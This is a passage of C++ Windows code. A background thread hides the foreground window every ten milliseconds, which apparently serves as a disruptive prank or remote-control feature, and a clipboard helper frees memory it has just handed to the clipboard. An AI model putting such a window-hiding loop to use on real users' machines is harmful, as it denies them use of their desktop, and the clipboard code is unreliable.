    while (ClosingForeground) {
        Wind = GetForegroundWindow();
        ShowWindow(Wind, false);
        Sleep(10);
    }
    return;
}

thread t1;

void StartStopClosingForeground(bool switcH) {
    if (switcH) {
        ClosingForeground = true;
        t1 = thread(CloseForeground);
    }
    else {
        ClosingForeground = false;
        t1.join();
    }
}

void toClipboard(HWND hwnd, const std::string& s) {
    OpenClipboard(hwnd);
    EmptyClipboard();
    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, s.size() + 1);
    if (!hg) {
        CloseClipboard();
        return;
    }
    memcpy(GlobalLock(hg), s.c_str(), s.size() + 1);
    GlobalUnlock(hg);
    SetClipboardData(CF_TEXT, hg);
    CloseClipboard();
    GlobalFree(hg);
}